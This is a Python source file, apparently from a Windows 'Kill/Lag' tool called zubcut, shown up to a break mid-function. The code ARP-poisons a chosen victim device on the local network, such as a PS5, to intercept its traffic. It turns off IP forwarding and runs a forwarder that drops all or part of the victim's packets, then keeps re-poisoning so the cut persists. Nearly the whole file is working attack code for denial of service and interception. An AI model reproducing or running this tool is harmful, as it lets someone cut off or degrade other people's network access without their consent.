from scapy.all import ARP, Ether, conf
from time import monotonic, sleep
import sys
import threading

from networking.forwarder import MitmForwarder, _MAX_DELAY_MS, _MAX_SHAPING_KBPS
from tools.pfctl import ensure_pf_enabled, install_anchor, block_all_for, unblock_all_for
from tools.utils import (
    threaded,
    get_default_iface,
    get_iface_for_victim_ip,
    get_gateway_ip,
    get_gateway_mac,
    get_my_ip,
    good_mac,
    get_vendor,
    run_command,
    mac_address_is_usable,
    lookup_mac_from_arp_table,
    victim_endpoint_live_for_mitm,
    _lan_neighbor_mac_via_arp_probe,
    npcap_iface_tokens,
    bind_scapy_conf_iface,
)
from constants import *
from tools.crash_feedback import safe_daemon_target


_forwarding_lock = threading.Lock()
_forwarding_desired: bool | None = None
_forwarding_worker: threading.Thread | None = None


def _set_ip_enable_router_registry(want: int) -> bool:
    """Fast persistent IPEnableRouter write (no PowerShell). Returns True on success."""
    try:
        import winreg

        key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r'SYSTEM\CurrentControlSet\Services\Tcpip\Parameters',
            0,
            winreg.KEY_SET_VALUE,
        )
        winreg.SetValueEx(key, 'IPEnableRouter', 0, winreg.REG_DWORD, int(want))
        winreg.CloseKey(key)
        return True
    except Exception:
        pass
    try:
        proc = run_command(
            [
                'reg',
                'add',
                r'HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters',
                '/v',
                'IPEnableRouter',
                '/t',
                'REG_DWORD',
                '/d',
                str(int(want)),
                '/f',
            ],
            shell=False,
            timeout=5,
        )
        if int(getattr(proc, 'returncode', 1) or 1) == 0:
            return True
    except Exception:
        pass
    try:
        from tools.zubcut_log import app_log

        app_log('ip_enable_router_write_failed', want=int(want))
    except Exception:
        pass
    return False


def _iface_indexes_from_netsh(show_out: str) -> list[str]:
    """Parse ``netsh interface ipv4 show interfaces`` Idx column."""
    return [idx for idx, _name in _iface_rows_from_netsh(show_out)]


def _iface_rows_from_netsh(show_out: str) -> list[tuple[str, str]]:
    """Parse ``netsh interface ipv4 show interfaces`` → [(idx, name), ...]."""
    rows: list[tuple[str, str]] = []
    for line in str(show_out or '').splitlines():
        parts = line.split()
        if len(parts) < 5 or not parts[0].isdigit():
            continue
        # Typical: "  12  25  1500  connected  Wi-Fi"
        rows.append((parts[0], ' '.join(parts[4:])))
    return rows


def _netsh_set_iface_forwarding(iface_key: str, enabled: bool) -> bool:
    """One fast per-iface netsh toggle. ``iface_key`` is index or interface name."""
    key = str(iface_key or '').strip()
    if not key:
        return False
    flag = 'enabled' if enabled else 'disabled'
    try:
        proc = run_command(
            [
                'netsh',
                'interface',
                'ipv4',
                'set',
                'interface',
                key,
                f'forwarding={flag}',
            ],
            shell=False,
            timeout=3,
        )
        # Non-admin netshe silently fails (access denied) — do not pretend success.
        return int(getattr(proc, 'returncode', 1) or 1) == 0
    except Exception:
        return False


def _priority_iface_keys(priority_iface: str | None, show_out: str = '') -> list[str]:
    """Resolve active adapter to netsh keys (name + matching Idx)."""
    name = str(priority_iface or '').strip()
    if not name:
        return []
    keys = [name]
    name_l = name.lower()
    for idx, iface_name in _iface_rows_from_netsh(show_out):
        if iface_name.lower() == name_l or name_l in iface_name.lower():
            if idx not in keys:
                keys.append(idx)
            break
    return keys


def _apply_windows_ip_forwarding_ifaces(
    enabled: bool,
    *,
    priority_iface: str | None = None,
    priority_only: bool = False,
) -> None:
    """Per-interface runtime switch via netsh (avoid PowerShell cold-start on Kill)."""
    try:
        show = run_command(
            ['netsh', 'interface', 'ipv4', 'show', 'interfaces'],
            shell=False,
            timeout=6,
        )
        show_s = str(getattr(show, 'stdout', None) or '')
    except Exception:
        show_s = ''
    # Kill hot path: flip the active NIC first (sync caller may have done this already).
    prio_keys = _priority_iface_keys(priority_iface, show_s)
    for key in prio_keys:
        _netsh_set_iface_forwarding(key, enabled)
    # When Clumsy/ICS SoftAP is live, only touch the priority LAN NIC — never
    # blast-disable every adapter (that knocks hotspot clients offline). If the
    # priority name did not resolve, skip the all-NIC path rather than falling through.
    if priority_only:
        return
    indexes = _iface_indexes_from_netsh(show_s)
    if not indexes:
        # Fallback once — slower, but only when netsh parse fails.
        try:
            ps_flag = 'Enabled' if enabled else 'Disabled'
            run_command(
                [
                    'powershell',
                    '-NoProfile',
                    '-WindowStyle',
                    'Hidden',
                    '-Command',
                    'Get-NetIPInterface -AddressFamily IPv4 -ErrorAction SilentlyContinue | '
                    'ForEach-Object { '
                    'Set-NetIPInterface -InterfaceIndex $_.InterfaceIndex '
                    f"-AddressFamily IPv4 -Forwarding {ps_flag} -ErrorAction SilentlyContinue "
                    '}',
                ],
                shell=False,
                timeout=12,
            )
        except Exception:
            pass
        return
    for idx in indexes:
        try:
            _netsh_set_iface_forwarding(idx, enabled)
        except Exception:
            continue


_forwarding_priority_iface: str | None = None
_forwarding_priority_only: bool = False

# After Kill OFF, leftover MITM still delivers frames here until ARP expires.
# Keep a 100% pass-through (never hard-drop) so WAN is not black-holed.
# Never stop while leftover MITM is still delivering packets here. Hold at
# least MIN even if the console is idle (no WAN), then stop after QUIET.
_RESTORE_PASS_MIN_S = 180.0
_RESTORE_PASS_QUIET_S = 45.0
_RESTORE_PASS_BUSY_SLIDE_S = 45.0


def _forwarder_is_pass_all(fw) -> bool:
    """True when the Npcap forwarder is live and forwarding both directions."""
    if fw is None or not getattr(fw, 'running', False):
        return False
    if getattr(fw, 'drop_from_victim', False) or getattr(fw, 'drop_to_victim', False):
        return False
    try:
        if int(getattr(fw, 'pass_from_victim_pct', 0) or 0) < 100:
            return False
        if int(getattr(fw, 'pass_to_victim_pct', 0) or 0) < 100:
            return False
    except Exception:
        return False
    return True


def _drain_windows_ip_forwarding_applies() -> None:
    """Apply `_forwarding_desired` until stable (used by background worker / blocking)."""
    global _forwarding_worker
    while True:
        with _forwarding_lock:
            target = _forwarding_desired
            prio = _forwarding_priority_iface
            prio_only = _forwarding_priority_only
        if target is None:
            break
        try:
            _apply_windows_ip_forwarding_ifaces(
                target, priority_iface=prio, priority_only=prio_only
            )
        except Exception:
            pass
        with _forwarding_lock:
            # Re-loop when scope/target changed mid-apply (Clumsy on/off).
            if (
                _forwarding_desired is target
                and _forwarding_priority_only is prio_only
                and _forwarding_priority_iface == prio
            ):
                _forwarding_worker = None
                return


def _set_windows_ip_forwarding(
    enabled: bool,
    *,
    blocking: bool = False,
    priority_iface: str | None = None,
    priority_only: bool = False,
) -> None:
    """Runtime + persistent IPv4 forwarding toggle (Windows).

    ``netsh interface ipv4 set global forwarding=…`` is **invalid** — forwarding is
    per-interface. Kill's hot path must not block on PowerShell (multi-second delay);
    registry + active NIC are sync, remaining ifaces are background unless
    ``blocking=True`` (startup).
    """
    global _forwarding_desired, _forwarding_worker, _forwarding_priority_iface
    global _forwarding_priority_only
    if not sys.platform.startswith('win'):
        return
    want = 1 if enabled else 0
    # Cheap registry flip only on the caller thread — never stall Kill on netsh.
    _set_ip_enable_router_registry(want)
    prio = str(priority_iface or '').strip() or None

    # Registry alone does not change runtime forwarding. Close the cold-Kill leak
    # window by flipping the active NIC synchronously (~tens of ms) before the
    # background drain covers remaining adapters.
    if not enabled and prio and not blocking:
        try:
            _netsh_set_iface_forwarding(prio, False)
        except Exception:
            pass

    with _forwarding_lock:
        already = _forwarding_desired is enabled
        _forwarding_desired = enabled
        if prio:
            _forwarding_priority_iface = prio
        # Latest caller wins: Clumsy LAN Kill uses priority_only=True; a later
        # cold-start / non-Clumsy disable must be allowed to drain all ifaces.
        prev_prio_only = _forwarding_priority_only
        _forwarding_priority_only = bool(priority_only)
        scope_changed = prev_prio_only != _forwarding_priority_only
        worker_alive = _forwarding_worker is not None and _forwarding_worker.is_alive()
        if blocking:
            pass
        elif already and not prio and not scope_changed:
            # Same target + same scope — Kill must not wait on netsh again.
            return
        elif worker_alive:
            # Worker will re-read `_forwarding_desired` / priority iface / scope.
            return
        else:
            thr = threading.Thread(
                target=safe_daemon_target(_drain_windows_ip_forwarding_applies),
                name='zubcut-ip-forwarding',
                daemon=True,
            )
            _forwarding_worker = thr
            thr.start()
            return

    # blocking path (startup clean): apply now on this thread.
    _drain_windows_ip_forwarding_applies()


def _iface_forwarding_enabled_netsh(iface_key: str) -> bool | None:
    """True/False when ``netsh … show interface <key>`` reports Forwarding; None if unknown."""
    key = str(iface_key or '').strip()
    if not key:
        return None
    try:
        out = run_command(
            ['netsh', 'interface', 'ipv4', 'show', 'interface', key],
            shell=False,
            timeout=1,
        )
        text = str(getattr(out, 'stdout', None) or '')
    except Exception:
        return None
    # EN Forwarding / DE Weiterleitung / FR Réacheminement / ES Reenvío …
    key_hints = (
        'forward',
        'weiterleit',
        'reachemin',
        'réachemin',
        'reenv',
        'inoltr',
    )
    on_vals = (
        'enabled',
        'aktiviert',
        'activé',
        'active',
        'activado',
        'attivo',
        'ein',
    )
    off_vals = (
        'disabled',
        'deaktiviert',
        'désactivé',
        'desactive',
        'desactivado',
        'disattivato',
        'aus',
    )
    for raw in text.splitlines():
        line = raw.strip()
        if ':' not in line:
            continue
        label, val = line.split(':', 1)
        label_l = label.strip().lower()
        val_l = val.strip().lower()
        if not any(h in label_l for h in key_hints):
            continue
        # Prefer exact token match so "disabled" is not read as "enabled".
        if val_l in on_vals:
            return True
        if val_l in off_vals:
            return False
    return None


def is_ip_forwarding_enabled() -> bool:
    """True when Windows kernel/global IPv4 forwarding is on (breaks MITM cut if forwarder absent)."""
    if not sys.platform.startswith('win'):
        return False
    try:
        import winreg

        key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r'SYSTEM\CurrentControlSet\Services\Tcpip\Parameters',
            0,
            winreg.KEY_READ,
        )
        val, _ = winreg.QueryValueEx(key, 'IPEnableRouter')
        winreg.CloseKey(key)
        if int(val or 0) != 0:
            return True
    except Exception:
        pass
    # Plural ``show interfaces`` has no Forwarding column — probe singular per Idx.
    # Cap probes: common case is registry=0 and all ifaces disabled; keep this fast.
    try:
        listing = run_command(
            ['netsh', 'interface', 'ipv4', 'show', 'interfaces'],
            shell=False,
            timeout=4,
        )
        show_s = str(getattr(listing, 'stdout', None) or '')
        # Probe enough adapters for multi-NIC / VPN / SoftAP PCs without
        # spending many seconds on singular netsh calls (post-arm warn only).
        for idx in _iface_indexes_from_netsh(show_s)[:8]:
            state = _iface_forwarding_enabled_netsh(idx)
            if state is True:
                return True
    except Exception:
        pass
    return False


def enable_ip_forwarding(
    *,
    blocking: bool = False,
    priority_iface: str | None = None,
    priority_only: bool = False,
):
    """Enable kernel IP forwarding (Windows: IPEnableRouter + per-iface netsh)."""
    _set_windows_ip_forwarding(
        True,
        blocking=blocking,
        priority_iface=priority_iface,
        priority_only=priority_only,
    )


def disable_ip_forwarding(
    *,
    blocking: bool = False,
    priority_iface: str | None = None,
    priority_only: bool = False,
):
    """Disable kernel IP forwarding so MITM forwarder is the only relay path.

    Non-blocking by default (registry sync + background netsh). Call **after**
    instant poison/cut on Kill — never before. Startup may pass ``blocking=True``.
    ``priority_iface`` (e.g. ``Wi-Fi``) is applied first in the background worker.
    ``priority_only=True`` skips other NICs (keeps Clumsy/ICS SoftAP forwarding).
    """
    _set_windows_ip_forwarding(
        False,
        blocking=blocking,
        priority_iface=priority_iface,
        priority_only=priority_only,
    )


def _lan_kill_priority_only() -> bool:
    """True when Clumsy SoftAP may need other-NIC forwarding left alone."""
    try:
        from tools.clumsy_inline import ics_forwarding_must_stay_on

        return bool(ics_forwarding_must_stay_on())
    except Exception:
        return False


class Killer:
    def __init__(self, router=DUMMY_ROUTER):
        self.iface = get_default_iface()
        # Dummy ``NULL`` iface (no live NIC / Npcap empty) must not be assigned to
        # conf.iface — Scapy raises ValueError and crashes startup (ZC-236TTZ).
        bind_scapy_conf_iface(
            getattr(self.iface, 'guid', None) or getattr(self.iface, 'name', None)
        )
        # Home-LAN Kill/Lag uses the userspace MitmForwarder. Leaving kernel
        # forwarding ON lets Windows relay redirected frames and makes Kill only
        # partial. Clumsy/ICS enables forwarding itself when needed.
        self.router = router
        self.killed = {}
        self.storage = {}
        self.forwarders = {}
        self.pf_blocks = set()
        # Leftover MACs from older keep-relay Kill OFF; discarded on kill/unkill.
        self._unkill_relays = set()
        # MAC -> monotonic deadline for post-OFF 100% pass-through.
        self._restore_pass_until = {}
        self._restore_pass_gen = {}
        self._socket = None  # Persistent L2 socket
        self._socket_token: str | None = None  # Npcap bind token that opened _socket
        # Npcap/Scapy L2socket is not safe for concurrent send from Kill GUI + ARP worker.
        self._socket_lock = threading.RLock()
        # Serialize hard-drop vs OFF pass-all so in-flight reinforce cannot reseal after unkill.
        self._cut_lock = threading.RLock()
        self._op_seq = {}  # MAC -> operation generation to cancel stale workers
        # Gateway MAC captured at Kill ON. Restore must not use a cache entry that
        # points at this PC (poison reflection / Analysis ping).
        self._restore_router = {}

    def _next_op_seq(self, mac):
        seq = int(self._op_seq.get(mac, 0)) + 1
        self._op_seq[mac] = seq
        return seq

    def _cut_gate(self):
        lock = getattr(self, '_cut_lock', None)
        if lock is None:
            lock = threading.RLock()
            self._cut_lock = lock
        return lock

    def _killed_keys_for_victim(self, victim) -> list:
        """Every ``killed`` key for this host (MAC case / ARP-refresh aliases)."""
        if not isinstance(victim, dict):
            return []
        want_mac = good_mac(str(victim.get('mac') or ''))
        want_ip = str(victim.get('ip') or '').strip()
        keys = []
        seen = set()
        for key, entry in list((getattr(self, 'killed', None) or {}).items()):
            if key in seen:
                continue
            rec = entry if isinstance(entry, dict) else {}
            got_mac = good_mac(str(rec.get('mac') or key or ''))
            got_ip = str(rec.get('ip') or '').strip()
            key_mac = good_mac(str(key or ''))
            if want_mac and (got_mac == want_mac or key_mac == want_mac):
                keys.append(key)
                seen.add(key)
                continue
            if want_ip and got_ip and got_ip == want_ip:
                keys.append(key)
                seen.add(key)
        return keys
    
    def _iface_l2_tokens(self) -> list[str]:
        if not self.iface or getattr(self.iface, 'name', None) in (None, '', 'NULL'):
            return []
        return npcap_iface_tokens(self.iface)

    def l2_socket_ready(self) -> bool:
        """True when the cached Npcap L2 socket is open for the current adapter."""
        sock = self._socket
        if sock is None:
            return False
        try:
            return not getattr(sock, 'closed', False)
        except Exception:
            return True

    def prewarm_l2_socket(self, *, join_ms: int = 0) -> bool:
        """
        Open/cache the Npcap L2 socket before the first Kill/Lag click.

        ``join_ms`` > 0 blocks up to that many ms (instant-cut path uses ~120ms).
        """
        if self.l2_socket_ready():
            return True
        if join_ms > 0:
            holder = {'ok': False}

            def _work() -> None:
                holder['ok'] = self._get_socket() is not None

            th = threading.Thread(
                target=safe_daemon_target(_work),
                name='zubcut-npcap-prewarm-sync',
                daemon=True,
            )
            th.start()
            th.join(max(0, int(join_ms)) / 1000.0)
            return bool(holder['ok'])
        try:
            threading.Thread(
                target=safe_daemon_target(self._get_socket),
                name='zubcut-npcap-prewarm',
                daemon=True,
            ).start()
        except Exception:
            pass
        return self.l2_socket_ready()

    def _get_socket(self):
        """Get or create persistent L2 socket — tries all Npcap bind tokens (GUID + name)."""
        with self._socket_lock:
            if self.l2_socket_ready():
                return self._socket
            self._socket = None
            self._socket_token = None
            try:
                from tools.windows_network_tune import ensure_npcap_ethernet_filter

                ensure_npcap_ethernet_filter(str(getattr(self.iface, 'name', '') or ''))
            except Exception:
                pass
            for round_i in range(2):
                for tok in self._iface_l2_tokens():
                    try:
                        self._socket = conf.L2socket(iface=tok)
                        self._socket_token = tok
                        try:
                            conf.iface = tok
                        except Exception:
                            pass
                        self._adopt_open_l2_token(tok)
                        return self._socket
                    except Exception:
                        self._socket = None
                        self._socket_token = None
                        continue
                if round_i == 0:
                    try:
                        from tools.utils import (
                            invalidate_ifaces_cache,
                            try_rebind_npcap_to_live_windows_adapters,
                        )

                        try_rebind_npcap_to_live_windows_adapters()
                        invalidate_ifaces_cache(full=True)
                    except Exception:
                        pass
            return None
    
    def _adopt_open_l2_token(self, tok: str) -> None:
        """Pin iface GUID/MAC to the Npcap bind that actually opened (not a name-matched ghost)."""
        tok = str(tok or '').strip()
        if not tok or self.iface is None:
            return
        try:
            from tools.utils import _extract_adapter_guid, _windows_softap_adapter_guids, _softap_bind_allowed

            gid = _extract_adapter_guid(tok)
            if gid and (not _softap_bind_allowed()) and gid in _windows_softap_adapter_guids():
                return
        except Exception:
            pass
        self.iface.guid = tok
        try:
            from scapy.all import get_if_hwaddr

            mac = good_mac(get_if_hwaddr(tok))
            if mac_address_is_usable(mac):
                self.iface.mac = mac
        except Exception:
            pass

    def _poison_hwsrc(self) -> str:
        """Ethernet/ARP source MAC for poison — the radio we are injecting on."""
        mac = good_mac(getattr(self.iface, 'mac', None) or '')
        if mac_address_is_usable(mac):
            return mac
        return good_mac(getattr(self.iface, 'mac', GLOBAL_MAC) or GLOBAL_MAC)

    def _send_packet(self, packet):
        """Send packet using persistent socket, fallback to new socket if needed"""
        sock = self._get_socket()
        if sock:
            try:
                with self._socket_lock:
                    sock.send(packet)
                return
            except Exception:
                # Socket died, recreate
                self._close_socket()
        
        # Fallback: direct send (creates new socket) — try every Npcap token.
        try:
            from scapy.all import sendp

            for tok in self._iface_l2_tokens():
                try:
                    sendp(packet, iface=tok, verbose=0)
                    return
                except Exception:
                    continue
        except Exception:
            pass
    
    def _close_socket(self):
        """Close persistent socket"""
        with self._socket_lock:
            if self._socket:
                try:
                    self._socket.close()
                except Exception:
                    pass
                self._socket = None
            self._socket_token = None

    def _sync_iface_for_victim(self, victim, *, refresh_router=True):
        """
        Rebind killer iface/router context to whatever NIC reaches victim['ip'].
        Safe no-op if already on the right interface.

        On Clumsy hotspot (ICS), caller must pass refresh_router=False and set router
        to 192.168.137.1 via apply_clumsy_ics_router_context — otherwise we pick the
        home LAN gateway and break hotspot internet / stick ARP "on" after OFF.
        """
        ip = victim.get('ip') if isinstance(victim, dict) else None
        if not ip:
            return
        target = get_iface_for_victim_ip(ip, fallback=self.iface)
        same_iface = (
            getattr(target, 'guid', None) == getattr(self.iface, 'guid', None)
            and getattr(target, 'name', None) == getattr(self.iface, 'name', None)
        )
        if same_iface and not refresh_router:
            return
        if same_iface:
            return
        prev_router = dict(self.router) if isinstance(self.router, dict) else {}
        prev_router_ip = str(prev_router.get('ip') or '').strip()
        prev_router_mac = prev_router.get('mac')
        self.iface = target
        self._close_socket()
        guid = self.iface.guid if getattr(self.iface, 'guid', None) else self.iface.name
        bind_scapy_conf_iface(guid)
        iface_ip = get_my_ip(guid)
        self.iface.ip = iface_ip
        self.iface.mac = good_mac(getattr(self.iface, 'mac', GLOBAL_MAC))
        if not refresh_router:
            return
        router_ip = get_gateway_ip(guid)
        # ARP-only first — Scapy getmacbyip can stall Kill ON ~4s on cold/wedged Npcap.
        router_mac = get_gateway_mac(iface_ip, router_ip, allow_scapy_probe=False)
        if (
            sys.platform.startswith('win')
            and router_ip
            and not mac_address_is_usable(router_mac)
        ):
            try:
                run_command(
                    ['ping', '-n', '1', '-w', '500', str(router_ip)],
                    shell=False,
                    timeout=2,
                )
            except Exception:
                pass
            router_mac = get_gateway_mac(iface_ip, router_ip, allow_scapy_probe=False)
        # Kill OFF / Analysis can empty the ARP cache. Do not replace a known
        # gateway MAC with GLOBAL_MAC or the next Kill cannot MITM.
        if (
            not mac_address_is_usable(router_mac)
            and mac_address_is_usable(prev_router_mac)
            and (not router_ip or not prev_router_ip or router_ip == prev_router_ip)
        ):
            router_mac = prev_router_mac
            if not router_ip:
                router_ip = prev_router_ip
        # Do not Scapy-probe here — this runs on the Kill click thread; GLOBAL_MAC
        # is handled by mitm_prereqs / background warm if still unknown.
        self.router = {
            'ip': router_ip,
            'mac': router_mac,
            'vendor': get_vendor(router_mac),
            'type': 'Router',
            'name': '',
            'admin': True,
        }
    
    def _refresh_router_mac_for_mitm(self) -> None:
        """Best-effort gateway MAC for MITM when ARP cache is cold after Kill OFF."""
        router_ip = str((self.router or {}).get('ip') or '').strip()
        if not router_ip:
            return
        iface_ip = str(getattr(self.iface, 'ip', None) or '').strip()
        mac = lookup_mac_from_arp_table(router_ip, iface_ip)
        if not mac_address_is_usable(mac) and sys.platform.startswith('win'):
            try:
                run_command(
                    ['ping', '-n', '1', '-w', '800', router_ip],
                    shell=False,
                    timeout=2,
                )
            except Exception:
                pass
            mac = lookup_mac_from_arp_table(router_ip, iface_ip)
        if not mac_address_is_usable(mac):
            try:
                # Click-path helper — never fall through to getmacbyip (~4s).
                mac = get_gateway_mac(iface_ip, router_ip, allow_scapy_probe=False)
            except Exception:
                mac = GLOBAL_MAC
        if mac_address_is_usable(mac) and isinstance(self.router, dict):
            mine = good_mac(getattr(self.iface, 'mac', None) or '')
            # Reflected Wi‑Fi poison can teach Windows that the gateway is us.
            # Restore must keep the real router MAC from Kill ON.
            if mine and good_mac(mac) == mine:
                return
            self.router['mac'] = mac

    def _remember_restore_router(self) -> None:
        """Keep the real gateway MAC from Kill ON for later honest restore."""
        ip = str((self.router or {}).get('ip') or '').strip()
        mac = good_mac((self.router or {}).get('mac') or '')
        mine = good_mac(getattr(self.iface, 'mac', None) or '')
        if ip and mac_address_is_usable(mac) and mac != mine:
            self._restore_router = {'ip': ip, 'mac': mac}

    def _pin_local_gateway_neighbor_async(self) -> None:
        """Reinstall this PC's real gateway neighbor so broadcast/reflected poison cannot black-hole us."""
        if not sys.platform.startswith('win'):
            return
        ip, mac = self._restore_router_endpoint()
        if not ip or not mac_address_is_usable(mac):
            return
        iface_name = str(getattr(self.iface, 'name', '') or '').strip()
        if not iface_name or iface_name == 'NULL':
            return
        mac_hy = good_mac(mac).replace(':', '-').upper()

        def _work() -> None:
            show_s = ''
            try:
                show = run_command(
                    ['netsh', 'interface', 'ipv4', 'show', 'interfaces'],
                    shell=False,
                    timeout=6,
                )
                show_s = str(getattr(show, 'stdout', None) or '')
            except Exception:
                show_s = ''
            keys = _priority_iface_keys(iface_name, show_s) or [iface_name]
            for key in keys:
                for verb in ('set', 'add'):
                    try:
                        proc = run_command(
                            [
                                'netsh',
                                'interface',
                                'ipv4',
                                verb,
                                'neighbors',
                                key,
                                ip,
                                mac_hy,
                            ],
                            shell=False,
                            timeout=3,
                        )
                        if int(getattr(proc, 'returncode', 1) or 1) == 0:
                            return
                    except Exception:
                        continue

        try:
            threading.Thread(
                target=safe_daemon_target(_work),
                name='zubcut-pin-gw',
                daemon=True,
            ).start()
        except Exception:
            pass

    def _restore_router_endpoint(self) -> tuple[str, str]:
        """Gateway IP/MAC for restore. Never use this PC's MAC as the gateway."""
        ip = str((self.router or {}).get('ip') or '').strip()
        mac = good_mac((self.router or {}).get('mac') or '')
        mine = good_mac(getattr(self.iface, 'mac', None) or '')
        snap = getattr(self, '_restore_router', None) or {}
        if (not mac_address_is_usable(mac) or mac == mine) and isinstance(snap, dict):
            sip = str(snap.get('ip') or '').strip()
            smac = good_mac(snap.get('mac') or '')
            if sip:
                ip = sip
            if mac_address_is_usable(smac) and smac != mine:
                mac = smac
        if mine and mac == mine:
            return ip, ''
        return ip, mac

    def mitm_prereqs_ok(self, victim, *, ping_attempts: int = 1) -> tuple[bool, str]:
        """True when victim + router MACs are known enough to MITM on LAN."""
        if not isinstance(victim, dict):
            return False, 'no victim'
        if self.iface.name == 'NULL':
            return False, 'no network adapter'
        if not mac_address_is_usable((self.router or {}).get('mac')):
            self._refresh_router_mac_for_mitm()
        if not mac_address_is_usable((self.router or {}).get('mac')):
            return False, 'router MAC unknown (ping gateway, check Npcap)'
        if not mac_address_is_usable(getattr(self.iface, 'mac', None)):
            return False, 'PC adapter MAC unknown'
        self._refresh_victim_mac_from_cache(victim)
        iface_guid = ''
        try:
            iface_guid = str(
                getattr(self.iface, 'guid', None) or getattr(self.iface, 'name', None) or ''
            ).strip()
        except Exception:
            iface_guid = ''
        victim_ip = str(victim.get('ip') or '').strip()
        iface_ip = str(getattr(self.iface, 'ip', None) or '').strip()
        cache_mac = (
            lookup_mac_from_arp_table(victim_ip, iface_ip) if victim_ip else ''
        )
        recent_probe_mac = ''
        # Scapy arping can cost ~2s per iface token — skip when OS ARP already has the IP.
        # Device-table MAC alone is not enough: PS5 often has a scan MAC while ARP is cold.
        if victim_ip and not mac_address_is_usable(cache_mac):
            probed = _lan_neighbor_mac_via_arp_probe(
                victim_ip, iface_guid, iface=self.iface
            )
            if mac_address_is_usable(probed):
                victim['mac'] = probed
                cache_mac = probed
                recent_probe_mac = probed
        elif mac_address_is_usable(cache_mac):
            victim['mac'] = cache_mac
        if not mac_address_is_usable(victim.get('mac')):
            return False, 'victim MAC unknown (ping PS5, rescan)'
        live_ok, live_reason = victim_endpoint_live_for_mitm(
            victim.get('ip'),
            victim.get('mac'),
            iface_ip or None,
            ping_attempts=max(1, int(ping_attempts)),
            # Already probed above when cache was cold — do not pay a second arping.
            # Pass the probed MAC so liveness still succeeds when ICMP is blocked and
            # the OS ARP cache has not absorbed the who-has reply yet.
            arp_probe_iface=None,
            recent_arp_mac=recent_probe_mac or None,
        )
        if not live_ok:
            return False, live_reason
        return True, ''

    def _refresh_victim_mac_from_cache(self, victim) -> None:
        """Best-effort ARP cache refresh for victim MAC before poison."""
        if not isinstance(victim, dict):
            return
        ip = str(victim.get('ip') or '').strip()
        if not ip:
            return
        iface_ip = str(getattr(self.iface, 'ip', None) or '').strip()
        mac = lookup_mac_from_arp_table(ip, iface_ip)
        if not mac_address_is_usable(mac) and sys.platform.startswith('win'):
            try:
                run_command(
                    ['ping', '-n', '1', '-w', '500', ip],
                    shell=False,
                    timeout=2,
                )
            except Exception:
                pass
            mac = lookup_mac_from_arp_table(ip, iface_ip)
        if mac_address_is_usable(mac):
            victim['mac'] = mac

    def kill(self, victim, wait_after=2, *, traffic_cut=True, ics_mode=False):
        """
        Spoofing victim.
        Default 2 second delay - ARP cache lasts 30-120s, no need to spam.
        Prevents Windows NDIS throttling.

        Registers ``self.killed`` on the caller thread so UI state (e.g. toggleKill)
        stays in sync; only the ARP loop runs in a background thread.

        ``traffic_cut=False`` arms ARP MITM only (Percent Cut / link shaping set their
        own forwarder pass ratios — calling kill() with the default 0% cut first made
        Percent Cut feel like a full Kill until OFF).

        Instant cut order (must stay first): poison → ARP worker → 0% traffic cut.
        Forwarding disable + full-cut reinforce run only after that arm.
        """
        self._sync_iface_for_victim(victim, refresh_router=not ics_mode)
        self._refresh_victim_mac_from_cache(victim)
        self._remember_restore_router()
        self._get_socket()
        mac = victim['mac']
        relays = getattr(self, '_unkill_relays', None)
        if isinstance(relays, set):
            relays.discard(mac)
        # Reassert path: even if already marked killed, refresh victim record and restart
        # ARP worker generation so ON state recovers from stale/desynced workers.
        seq = self._next_op_seq(mac)
        self.killed[mac] = victim
        self._cancel_restore_pass(mac)
        self._stop_forwarder(mac)
        self._pin_local_gateway_neighbor_async()
        # Instant path first: poison + cut. Forwarding disable / probes come after.
        self._poison_arp_now(victim, seq, repeats=3, delay_s=0)
        self._kill_arp_worker(
            victim,
            wait_after,
            seq,
            aggressive=bool(traffic_cut and not ics_mode),
        )
        if not ics_mode and traffic_cut:
            self._apply_traffic_cut_sync(victim)
        if not ics_mode:
            # After cut is armed — seal kernel relay without delaying the first hit.
            # With Clumsy/hotspot SoftAP live, only flip the LAN NIC so ICS keeps working.
            disable_ip_forwarding(
                priority_iface=getattr(self.iface, 'name', None),
                priority_only=_lan_kill_priority_only(),
            )
        if not ics_mode and traffic_cut:
            # Background only: reseal poison/cut/forwarding without delaying the click.
            self._reinforce_full_cut_async(victim)

    def _apply_traffic_cut_sync(self, victim):
        """Start 100% drop forwarder on the caller thread (Kill must not miss re-arm)."""
        if not isinstance(victim, dict):
            return False
        mac = victim.get('mac')
        if not mac or mac not in self.killed:
            return False
        # Hot path: GUI already validated live MITM; do not re-ping here.
        if not mac_address_is_usable((self.router or {}).get('mac')):
            try:
                from tools.zubcut_log import app_log

                app_log(
                    'traffic_cut_skipped',
                    reason='router_mac',
                    ip=str(victim.get('ip') or ''),
                )
            except Exception:
                pass
            return False
        if not mac_address_is_usable(victim.get('mac')):
            try:
                from tools.zubcut_log import app_log

                app_log(
                    'traffic_cut_skipped',
                    reason='victim_mac',
                    ip=str(victim.get('ip') or ''),
                )
            except Exception:
                pass
            return False
        # Never arm a new Kill from this path. After OFF, ``apply_percent_cut``
        # used to see an empty ``killed`` and call ``kill()`` — restore then
        # instant re-cut (same hole as Dupe).
        self.apply_percent_cut(victim, pass_percent=0, arm_if_needed=False)
        fw = self.forwarders.get(mac)
        return bool(fw and getattr(fw, 'running', False))

    @threaded
    def apply_traffic_cut(self, victim):
        """
        Drop all victim IP traffic that reaches us via ARP MITM.

        ARP poison alone is not enough on Windows when IP forwarding is enabled —
        the kernel may still relay frames unless user-space intercepts and drops them.
        """
        self._apply_traffic_cut_sync(victim)

    def reassert_poison(self, victim, repeats=3):
        """
        Extra poison burst without bumping ``_op_seq`` or restarting the ARP worker.

        Lag start reassert timers (0/40/110 ms) must use this — calling ``kill()``
        again cancels the worker mid-loop and MITM never sustains (no lag at all).
        """
        mac = victim.get('mac') if isinstance(victim, dict) else None
        if not mac or mac not in self.killed:
            return
        seq = int(self._op_seq.get(mac, 0))
        self._poison_arp_now(victim, seq, repeats=max(1, int(repeats)), delay_s=0)

    def _seal_hard_drop(self, mac) -> bool:
        """Ensure a live forwarder hard-drops both directions (full Kill)."""
        if not mac:
            return False
        with self._cut_gate():
            if mac not in self.killed:
                return False
            fw = self.forwarders.get(mac)
            if not (fw and getattr(fw, 'running', False)):
                return False
            try:
                fw.drop_from_victim = True
                fw.drop_to_victim = True
                fw.pass_from_victim_pct = 0
                fw.pass_to_victim_pct = 0
            except Exception:
                return False
            # OFF can pop ``killed`` and ``pass_all_live`` between the check and
            # the writes. Undo so the brief restore cannot be resealed.
            if mac not in self.killed:
                try:
